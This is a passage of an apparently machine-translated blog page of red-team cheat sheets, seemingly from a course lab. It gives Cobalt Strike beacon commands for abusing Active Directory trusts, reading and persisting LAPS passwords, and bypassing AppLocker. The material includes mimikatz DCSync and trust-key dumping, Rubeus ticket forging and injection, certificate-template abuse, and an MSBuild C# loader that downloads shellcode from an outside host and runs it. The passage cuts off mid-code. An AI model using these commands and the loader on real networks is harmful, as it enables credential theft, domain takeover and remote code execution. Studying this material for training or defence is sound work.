class="hljs-type">...</span>]MuaW8=<br><span class="hljs-comment"># Getting TGS from inter-realm TGT for Target Domain</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:cifs/dc.dev<span class="hljs-literal">-studio</span>.com /domain:dev<span class="hljs-literal">-studio</span>.com /dc:dc.dev<span class="hljs-literal">-studio</span>.com /nowrap /ticket:doIFoz[<span class="hljs-type">...</span>]NPTQ==<br>  <br><span class="hljs-comment"># 4. Inject the ticket</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:dc<span class="hljs-literal">-studio</span>.com /username:Administrator /password:FakePass /ticket:doIFLz[<span class="hljs-type">...snip...</span>]MuaW8=<br>  <br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:doIFLz[<span class="hljs-type">...snip...</span>]MuaW8=<br>  <br>beacon&gt; steal_token <span class="hljs-number">5060</span><br>beacon&gt; run klist<br>beacon&gt; <span class="hljs-built_in">ls</span> \\dc.dev<span class="hljs-literal">-studio</span>.com\c<span class="hljs-variable">$</span><br>  <br><span class="hljs-comment"># ---------------------------------------------------------------------------------</span><br><span class="hljs-comment">## Exploiting Outbound Trusts (Users in other domain can access resources in our domain)</span><br>  <br><span class="hljs-comment"># 1. Enumerate the outbound trust (msp.com) in parent domain (cyberbotic.io)</span><br>beacon&gt; powershell<span class="hljs-literal">-import</span> c:\Tools\PowerSploit\Recon\PowerView.ps1<br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainTrust</span> <span class="hljs-literal">-Domain</span> cyberbotic.io<br>  <br><span class="hljs-comment"># 2. Enumerate the TDO to fetch the shared trust key </span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe <span class="hljs-literal">--search</span> <span class="hljs-string">&quot;(objectCategory=trustedDomain)&quot;</span> <span class="hljs-literal">--domain</span> cyberbotic.io <span class="hljs-literal">--attributes</span> distinguishedName,name,flatName,trustDirection<br>  <br><span class="hljs-comment"># 3-a. # Dump the TDO Object from DC (parent) directly - (Not OPSEC Safe)</span><br>beacon&gt; run hostname<br>beacon&gt; mimikatz lsadump::trust /patch<br>  <br><span class="hljs-comment"># 3-b. OR, Use DCSync to get the ntlm hash of TDO object remotely</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainObject</span> <span class="hljs-literal">-Identity</span> <span class="hljs-string">&quot;CN=msp.org,CN=System,DC=cyberbotic,DC=io&quot;</span> | <span class="hljs-built_in">select</span> objectGuid<br>beacon&gt; mimikatz @lsadump::dcsync /domain:cyberbotic.io /guid:&#123;b93d2e36<span class="hljs-literal">-48df-46bf-89d5-2fc22c139b43</span>&#125;<br>  <br><span class="hljs-comment"># 4. There is a &quot;trust account&quot; which gets created in trusted domain (msp.com) by the name of trusting domain (CYBER$), it can be impersonated to gain normal user access (/rc4 is the NTLM hash of TDO Object)</span><br><span class="hljs-comment"># Get all the user accounts in the DEV domain, we&#x27;ll see CYBER$ and STUDIO$, which are the trust accounts for those respective domain trusts.</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe <span class="hljs-literal">--search</span> <span class="hljs-string">&quot;(objectCategory=user)&quot;</span><br>  <br><span class="hljs-comment"># 5. Outbound Domain (MSP domain) will have a trust account (CYBER$), even though we can&#x27;t enumerate across the trust to confirm it.  This is the account we must impersonate to request Kerberos tickets across the trust.</span><br><span class="hljs-comment"># A user can create Multiple computer objects and later can Abuse them, We have user access in this case, So find some way to abuse it.</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:CYBER<span class="hljs-variable">$</span> /domain:msp.org /rc4:<span class="hljs-number">8</span>c0124e706679550bf14182477f7a8dc /nowrap<br>  <br><span class="hljs-comment"># 6. Inject the ticket</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:MSP /username:CYBER<span class="hljs-variable">$</span> /password:FakePass /ticket:doIFLz[<span class="hljs-type">...snip...</span>]MuaW8=<br>  <br>beacon&gt; steal_token <span class="hljs-number">5060</span><br>beacon&gt; run klist<br>  <br><span class="hljs-comment"># 7. We can now use the normal user session, to enumerate the domain. OR We can create Multiple computer objects and later can Abuse them, We have user access in this case, So find some way to abuse it.</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-Domain</span> <span class="hljs-literal">-Domain</span> msp.org<br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe <span class="hljs-literal">--search</span> <span class="hljs-string">&quot;(objectCategory=user)&quot;</span> <span class="hljs-literal">--domain</span> msp.org<br>  <br><span class="hljs-comment"># Create a Computer Object to abuse it</span><br>beacon&gt; powershell<span class="hljs-literal">-import</span> c:\Tools\PowerSploit\Recon\PowerView.ps1<br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainObject</span> <span class="hljs-literal">-Identity</span> <span class="hljs-string">&quot;DC=dev,DC=cyberbotic,DC=io&quot;</span> <span class="hljs-literal">-Properties</span> ms<span class="hljs-literal">-DS-MachineAccountQuota</span><br><span class="hljs-comment"># If You wants to create a new computer object for a different Forest using StandIn Tool, Then Read this blog by Rasta - https://rastamouse.me/getdomain-vs-getcomputerdomain-vs-getcurrentdomain/</span><br><span class="hljs-comment"># Note: StandIn code needs to be modified if you wants to create a Computer in another Domain using --Domain parameter. (https://github.com/FuzzySecurity/StandIn/pull/17)</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\StandIn\StandIn\StandIn\bin\Release\StandIn.exe <span class="hljs-literal">--computer</span> EvilComputer <span class="hljs-literal">--make</span> <span class="hljs-literal">--Domain</span> dev.cyberbotic.io <br><span class="hljs-built_in">PS</span>&gt; C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /password:oIrpupAtF1YCXaw /user:EvilComputer<span class="hljs-variable">$</span> /domain:dev.cyberbotic.io<br>  <br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:EvilComputer<span class="hljs-variable">$</span> /aes256:<span class="hljs-number">7</span>A79DCC14E6508DA9536CD949D857B54AE4E119162A865C40B3FFD46059F7044 /nowrap<br>  <br><span class="hljs-comment"># 8. Perform Few enumerations to get access to the forest.</span><br>  <br><span class="hljs-comment"># Kerberoasting / ASRepRoasting / Set SPN</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe <span class="hljs-literal">--search</span> <span class="hljs-string">&quot;(&amp;(objectCategory=user)(servicePrincipalName=*))&quot;</span> <span class="hljs-literal">--attributes</span> cn,servicePrincipalName,samAccountName <span class="hljs-literal">--domain</span> msp.org<br>  <br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainUser</span> <span class="hljs-literal">-SPN</span> <span class="hljs-literal">-Domain</span> msp.org<br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainUser</span> <span class="hljs-literal">-PreauthNotRequired</span> <span class="hljs-literal">-Verbose</span> <span class="hljs-literal">-Domain</span> msp.org<br>beacon&gt; powerpick <span class="hljs-built_in">Find-InterestingDomainAcl</span> <span class="hljs-literal">-ResolveGUIDs</span> <span class="hljs-literal">-Domain</span> msp.org | ?&#123;<span class="hljs-variable">$_</span>.IdentityReferenceName <span class="hljs-operator">-match</span> <span class="hljs-string">&quot;CYBER<span class="hljs-variable">$</span>&quot;</span>&#125;<br>  <br><span class="hljs-comment"># Unconstrained Delegation </span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainComputer</span> <span class="hljs-literal">-UnConstrained</span> <span class="hljs-literal">-Domain</span> msp.org<br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainComputer</span> <span class="hljs-literal">-UnConstrained</span> <span class="hljs-literal">-Domain</span> msp.org<br>  <br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe <span class="hljs-literal">--search</span> <span class="hljs-string">&quot;(&amp;(ObjectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> <span class="hljs-literal">--attributes</span> cn,dnshostname <span class="hljs-literal">--domain</span> msp.org<br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe <span class="hljs-literal">--search</span> <span class="hljs-string">&quot;(&amp;(ObjectCategory=User)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> <span class="hljs-literal">--attributes</span> cn,dnshostname <span class="hljs-literal">--domain</span> msp.org<br>  <br><span class="hljs-comment"># Constrained Delegation</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainUser</span> <span class="hljs-literal">-TrustedToAuth</span> <span class="hljs-literal">-Domain</span> msp.org<br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainComputer</span> <span class="hljs-literal">-TrustedToAuth</span> <span class="hljs-literal">-Domain</span> msp.org<br>  <br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe <span class="hljs-literal">--search</span> <span class="hljs-string">&quot;(&amp;(objectCategory=computer)(msds-allowedtodelegateto=*))&quot;</span> <span class="hljs-literal">--attributes</span> dnshostname,samaccountname,msds<span class="hljs-literal">-allowedtodelegateto</span> <span class="hljs-literal">--json</span> <span class="hljs-literal">--domain</span> msp.org<br>  <br><span class="hljs-comment"># Vulnerable Certificate Templates</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Certify\Certify\bin\Release\Certify.exe find /vulnerable /domain:msp.org<br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Certify\Certify\bin\Release\Certify.exe find /enrolleeSuppliesSubject /domain:msp.org<br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:ad.msp.org\root<span class="hljs-literal">-ca</span> /template:MSPUserTemplate /altname:Administrator /domain:msp.org<br><span class="hljs-comment"># Certify doesn&#x27;t work well across outbound trust, So to abuse such attack scenario either we have to modify the Certify or we can use native certreq tool (https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certreq_1).</span><br><span class="hljs-comment"># For OutBound Forests the Certify fails , So we have to modify it. Or for manually performing this attack using certreq follow belo links.</span><br>- <span class="hljs-keyword">For</span> help check this<br>[<span class="hljs-type">https</span>://<span class="hljs-type">github.com</span>/<span class="hljs-type">GhostPack</span>/<span class="hljs-type">Certify</span>/<span class="hljs-type">issues</span>/<span class="hljs-number">13</span><span class="hljs-comment">#issuecomment-1716046133](https://github.com/GhostPack/Certify/issues/13#issuecomment-1716046133)</span><br>  <br></code></pre></td></tr></table></figure></li>
</ul>
<h3 id="洛杉矶郡"><a href="#洛杉矶郡" class="headerlink" title="洛杉矶郡"></a>洛杉矶郡</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## Abusing LAPS (Local Administrator Password Solution)</span><br><br><span class="hljs-comment"># 1. Enumerate for presence of LAPS and GPO Policy implementing the Laps.</span><br><span class="hljs-comment"># 1.1 Check if, LAPS client is installed on local machine</span><br>beacon&gt; <span class="hljs-built_in">ls</span> C:\Program Files\LAPS\CSE<br><span class="hljs-comment"># 1.2 Check for, Computer Object having ms-Mcs-AdmPwdExpirationTime attribute is set to Not Null.</span><br>beacon&gt; powershell<span class="hljs-literal">-import</span> c:\Tools\PowerSploit\Recon\PowerView.ps1<br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainComputer</span> | ? &#123; <span class="hljs-variable">$_</span>.<span class="hljs-string">&quot;ms-Mcs-AdmPwdExpirationTime&quot;</span> <span class="hljs-operator">-ne</span> <span class="hljs-variable">$null</span> &#125; | <span class="hljs-built_in">select</span> dnsHostName<br><br><span class="hljs-comment"># 2. Enumerate GPO which are used to deploy LAPS configurations</span><br><span class="hljs-comment"># 2.1 Check for GPOs that have &quot;LAPS&quot; or some other descriptive term in the name.</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainGPO</span> | ? &#123; <span class="hljs-variable">$_</span>.DisplayName <span class="hljs-operator">-like</span> <span class="hljs-string">&quot;*laps*&quot;</span> &#125; | <span class="hljs-built_in">select</span> DisplayName, Name, GPCFileSysPath | <span class="hljs-built_in">fl</span><br><span class="hljs-comment"># 2.2 Download LAPS configuration (Using name or cn attribute values from Laps GPO)</span><br>beacon&gt; <span class="hljs-built_in">ls</span> \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\&#123;<span class="hljs-number">2</span>BE4337D<span class="hljs-literal">-D231-4D23-A029-7B999885E659</span>&#125;\Machine<br>beacon&gt; download \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\&#123;<span class="hljs-number">2</span>BE4337D<span class="hljs-literal">-D231-4D23-A029-7B999885E659</span>&#125;\Machine\Registry.pol<br><span class="hljs-comment"># 2.3 Parse the LAPS GPO Policy file downloaded in previous step</span><br><span class="hljs-built_in">PS</span> C:\Users\Attacker&gt; Parse<span class="hljs-literal">-PolFile</span> .\Desktop\Registry.pol<br><br><span class="hljs-comment"># 3. Finding Principals which can read the LAPS Passwords or ms-Mcs-AdmPwd Attribute.</span><br><span class="hljs-comment"># 3.1 Search DACL of each computer to find the read rights</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainComputer</span> | <span class="hljs-built_in">Get-DomainObjectAcl</span> <span class="hljs-literal">-ResolveGUIDs</span> | ? &#123; <span class="hljs-variable">$_</span>.ObjectAceType <span class="hljs-operator">-eq</span> <span class="hljs-string">&quot;ms-Mcs-AdmPwd&quot;</span> <span class="hljs-operator">-and</span> <span class="hljs-variable">$_</span>.ActiveDirectoryRights <span class="hljs-operator">-match</span> <span class="hljs-string">&quot;ReadProperty&quot;</span> &#125; | <span class="hljs-built_in">select</span> ObjectDn, SecurityIdentifier | <span class="hljs-built_in">fl</span><br>beacon&gt; powerpick <span class="hljs-built_in">ConvertFrom-SID</span> S<span class="hljs-literal">-1-5-21-569305411-121244042-2357301523-1107</span><br>beacon&gt; powershell<span class="hljs-literal">-import</span> c:\Tools\PowerSploit\Recon\PowerView.ps1<br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainGroupMember</span> <span class="hljs-literal">-Identity</span> <span class="hljs-string">&quot;DEV\Developers&quot;</span> <span class="hljs-literal">-Domain</span> dev.cyberbotic.io <span class="hljs-literal">-Recurse</span><br><span class="hljs-comment"># 3.2 Use LAPS Toolkit to find groups that have delegated read rights at OU and Computer level</span><br>beacon&gt; powershell<span class="hljs-literal">-import</span> C:\Tools\LAPSToolkit\LAPSToolkit.ps1<br>beacon&gt; powerpick <span class="hljs-built_in">Find-LAPSDelegatedGroups</span><br>beacon&gt; powershell<span class="hljs-literal">-import</span> c:\Tools\PowerSploit\Recon\PowerView.ps1<br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainGroupMember</span> <span class="hljs-literal">-Identity</span> <span class="hljs-string">&quot;DEV\Developers&quot;</span> <span class="hljs-literal">-Domain</span> dev.cyberbotic.io <span class="hljs-literal">-Recurse</span><br><span class="hljs-comment"># 3.3 Find-AdmPwdExtendedRights goes a little deeper and queries each individual computer for users that have &quot;All Extended Rights&quot;. This will reveal any users that can read the attribute without having had it specifically delegated to them.</span><br>beacon&gt; powerpick <span class="hljs-built_in">Find-AdmPwdExtendedRights</span><br><br><span class="hljs-comment"># 4. Reading LAPS Passwords or ms-Mcs-AdmPwd Attribute and using it to gain access.</span><br><span class="hljs-comment"># 4.1 View the LAPS password for given machine (From User Session having required rights)</span><br>beacon&gt; powershell<span class="hljs-literal">-import</span> c:\Tools\PowerSploit\Recon\PowerView.ps1<br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainComputer</span> <span class="hljs-literal">-Identity</span> wkstn<span class="hljs-literal">-1</span> <span class="hljs-literal">-Properties</span> ms<span class="hljs-literal">-Mcs-AdmPwd</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainComputer</span> <span class="hljs-literal">-Identity</span> wkstn<span class="hljs-literal">-1</span> <span class="hljs-literal">-Properties</span> ms<span class="hljs-literal">-Mcs-AdmPwd</span>, ms<span class="hljs-literal">-Mcs-AdmPwdExpirationTime</span><br><span class="hljs-comment"># 4.2 Use the laps password to gain access</span><br>beacon&gt; make_token .\LapsAdmin <span class="hljs-number">1</span>N3FyjJR5L18za<br>beacon&gt; <span class="hljs-built_in">ls</span> \\wkstn<span class="hljs-literal">-1</span>\c<span class="hljs-variable">$</span><br><br><span class="hljs-comment"># 5. Modifying Password Expiration Protection for Persistence</span><br><span class="hljs-comment"># 5.1 Make sure that LAPS policy settings PwdExpirationProtectionEnabled is not enabled , then only we can set the Password Expiration to a longer time, else it will trigger a password reset.</span><br><span class="hljs-built_in">PS</span> C:\Users\Attacker&gt; Parse<span class="hljs-literal">-PolFile</span> .\Desktop\Registry.pol<br><span class="hljs-comment"># 5.2 Check the current Expiration time</span><br>beacon&gt; powershell <span class="hljs-built_in">Get-DomainComputer</span> <span class="hljs-literal">-Identity</span> wkstn<span class="hljs-literal">-1</span> <span class="hljs-literal">-Properties</span> ms<span class="hljs-literal">-Mcs-AdmPwd</span>, ms<span class="hljs-literal">-Mcs-AdmPwdExpirationTime</span><br><span class="hljs-comment"># 5.3 Set Far Future date as expiry (Only machine can set its Password) (Use www.epochconverter.com/ldap)</span><br>beacon&gt; run hostname<br>beacon&gt; getuid<br>beacon&gt; powerpick <span class="hljs-built_in">Set-DomainObject</span> <span class="hljs-literal">-Identity</span> wkstn<span class="hljs-literal">-1</span> <span class="hljs-literal">-Set</span> <span class="hljs-selector-tag">@</span>&#123;<span class="hljs-string">&#x27;ms-Mcs-AdmPwdExpirationTime&#x27;</span> = <span class="hljs-string">&#x27;136257686710000000&#x27;</span>&#125; <span class="hljs-literal">-Verbose</span><br><br><span class="hljs-comment"># 6. LAPS Backdoor</span><br>- Modify the AdmPwd.PS.dll and AdmPwd.Utils.dll file located at C:\Windows\System32\WindowsPowerShell\v1.<span class="hljs-number">0</span>\Modules\AdmPwd.PS\ location to log the LAPS password everytime it is viewed by the admin user (Chevk Notes)<br></code></pre></td></tr></table></figure>

<h3 id="应用程序锁"><a href="#应用程序锁" class="headerlink" title="应用程序锁"></a>应用程序锁</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## Applocker Enumeration</span><br><br><span class="hljs-comment"># 1. On Local System</span><br><span class="hljs-comment"># 1.1 Using powershell on local system</span><br>beacon&gt; powershell <span class="hljs-variable">$ExecutionContext</span>.SessionState.LanguageMode<br><span class="hljs-comment"># 1.2 Enumerate the Applocker policy via Local Windows registry on machine </span><br><span class="hljs-built_in">PS</span> C:\Users\Administrator&gt; <span class="hljs-built_in">Get-ChildItem</span> <span class="hljs-string">&quot;HKLM:Software\Policies\Microsoft\Windows\SrpV2&quot;</span><br><span class="hljs-built_in">PS</span> C:\Users\Administrator&gt; <span class="hljs-built_in">Get-ChildItem</span> <span class="hljs-string">&quot;HKLM:Software\Policies\Microsoft\Windows\SrpV2\Exe&quot;</span><br><br><span class="hljs-comment"># 2. From any system - Enumerate the Applocker policy via GPO</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainGPO</span> <span class="hljs-literal">-Domain</span> dev<span class="hljs-literal">-studio</span>.com | ? &#123; <span class="hljs-variable">$_</span>.DisplayName <span class="hljs-operator">-like</span> <span class="hljs-string">&quot;*AppLocker*&quot;</span> &#125; | <span class="hljs-built_in">select</span> displayname, gpcfilesyspath<br>beacon&gt; download \\dev<span class="hljs-literal">-studio</span>.com\SysVol\dev<span class="hljs-literal">-studio</span>.com\Policies\&#123;<span class="hljs-number">7</span>E1E1636<span class="hljs-literal">-1A59-4C35-895B-3AEB1CA8CFC2</span>&#125;\Machine\Registry.pol<br><span class="hljs-built_in">PS</span> C:\Users\Attacker&gt; Parse<span class="hljs-literal">-PolFile</span> .\Desktop\Registry.pol<br><br><span class="hljs-comment">#-------------------------------------------------------------------------------------</span><br><span class="hljs-comment">## Writable Paths</span><br><span class="hljs-comment"># 1. Navigating Laterally via PSEXEC is fine, as service binary is uploaded in C:\Winodws path which is by default whitelisted.</span><br><span class="hljs-comment"># 2. Find the writable path within C:\winodws to bypass Applocker</span><br>beacon&gt; powershell <span class="hljs-built_in">Get-Acl</span> C:\Windows\Tasks | <span class="hljs-built_in">fl</span><br><span class="hljs-comment"># 3. In the default Applocker Policy , &quot;C:\Windows&quot; and &quot;C:\Program Files&quot; are whitelisted and we can run any binary from there, c:\Windows\Tasks is the directory where any standard user have write permissions.</span><br><span class="hljs-comment"># 4. When enumerating the rules, you may also find additional weak rules that system administrators have put in. For example</span><br>&lt;FilePathCondition Path=<span class="hljs-string">&quot;*\AppV\*&quot;</span>/&gt;<br><span class="hljs-comment">## Using LOLBAS to execute arbitrary code or Beacon Payload.</span><br><br><span class="hljs-comment"># If Applocker is enabled with strict policy, and most of the Binaries are not allowed to execute (like Powershell, External Binaries, Some specific directory binaries etc), then we can use Binaries From LOLBAS Project to execute our shellcode/payload/dll to get beacon.</span><br><span class="hljs-comment"># LOLBAS Project - https://lolbas-project.github.io/#/execute</span><br><br><span class="hljs-comment">#-------------------------------------------------------------------------------------</span><br><br><span class="hljs-comment">## Using MSBuild.exe to execute C# code from a .csproj or .xml file</span><br><br><span class="hljs-comment"># 1. Host http_x64.xprocess.bin via Site Management &gt; Host File</span><br><span class="hljs-comment"># 2. Start execution using command</span><br>C:\Windows\Microsoft.Net\Framework64\v4.<span class="hljs-number">0.30319</span>\MSBuild.exe test.csproj<br><br><span class="hljs-comment"># 3. Contents of test.csproj file, which us using a c# loader to download and execute shellcode.</span><br>&lt;Project ToolsVersion=<span class="hljs-string">&quot;4.0&quot;</span> xmlns=<span class="hljs-string">&quot;http://schemas.microsoft.com/developer/msbuild/2003&quot;</span>&gt;<br>  &lt;Target Name=<span class="hljs-string">&quot;MSBuild&quot;</span>&gt;<br>   &lt;MSBuildTest/&gt;<br>  &lt;/Target&gt;<br>   &lt;UsingTask<br>    TaskName=<span class="hljs-string">&quot;MSBuildTest&quot;</span><br>    TaskFactory=<span class="hljs-string">&quot;CodeTaskFactory&quot;</span><br>    AssemblyFile=<span class="hljs-string">&quot;C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll&quot;</span> &gt;<br>     &lt;Task&gt;<br>      &lt;Code <span class="hljs-built_in">Type</span>=<span class="hljs-string">&quot;Class&quot;</span> Language=<span class="hljs-string">&quot;cs&quot;</span>&gt;<br>        &lt;![<span class="hljs-type">CDATA</span>[<br><br>            <span class="hljs-type">using</span> <span class="hljs-type">System</span>;<br>            <span class="hljs-type">using</span> <span class="hljs-type">System.Net</span>;<br>            <span class="hljs-type">using</span> <span class="hljs-type">System.Runtime.InteropServices</span>;<br>            <span class="hljs-type">using</span> <span class="hljs-type">Microsoft.Build.Framework</span>;<br>            <span class="hljs-type">using</span> <span class="hljs-type">Microsoft.Build.Utilities</span>;<br><br>            <span class="hljs-type">public</span> <span class="hljs-type">class</span> <span class="hljs-type">MSBuildTest</span> :  <span class="hljs-type">Task</span>, <span class="hljs-type">ITask</span><br>            &#123;<br>                <span class="hljs-type">public</span> <span class="hljs-type">override</span> <span class="hljs-built_in">bool</span> <span class="hljs-type">Execute</span>()<br>                &#123;<br>                    <span class="hljs-built_in">byte</span>[] <span class="hljs-type">shellcode</span>;<br>                    <span class="hljs-type">using</span> (<span class="hljs-type">var</span> <span class="hljs-type">client</span> = <span class="hljs-type">new</span> <span class="hljs-type">WebClient</span>())<br>                    &#123;<br>                        <span class="hljs-type">client.BaseAddress</span> = <span class="hljs-string">&quot;http://nickelviper.com&quot;</span>;<br>                        <span class="hljs-type">shellcode</span> = <span class="hljs-type">client.DownloadData</span>(<span class="hljs-string">&quot;beacon.bin&quot;</span>);<br>                    &#125;<br>      <br>                    <span class="hljs-type">var</span> <span class="hljs-type">hKernel</span> = <span class="hljs-type">LoadLibrary</span>(<span class="hljs-string">&quot;kernel32.dll&quot;</span>);<br>                    <span class="hljs-type">var</span> <span class="hljs-type">hVa</span> = <span class="hljs-type">GetProcAddress</span>(<span class="hljs-type">hKernel</span>, <span class="hljs-string">&quot;VirtualAlloc&quot;</span>);<br>                    <span class="hljs-type">var</span> <span class="hljs-type">hCt</span> = <span class="hljs-type">GetProcAddress</span>(<span class="hljs-type">hKernel</span>, <span class="hljs-string">&quot;CreateThread&quot;</span>);<br><br>                    <span class="hljs-type">var</span> <span class="hljs-type">va</span> = <span class="hljs-type">Marshal.GetDelegateForFunctionPointer</span>&lt;<span class="hljs-type">AllocateVirtualMemory</span>&gt;(<span class="hljs-type">hVa</span>);<br>                    <span class="hljs-type">var</span> <span class="hljs-type">ct</span> = <span class="hljs-type">Marshal.GetDelegateForFunctionPointer</span>&lt;<span class="hljs-type">CreateThread</span>&gt;(<span class="hljs-type">hCt</span>);<br><br>                    <span class="hljs-type">var</span> <span class="hljs-type">hMemory</span> = <span class="hljs-type">va</span>(<span class="hljs-built_in">Int</span><span 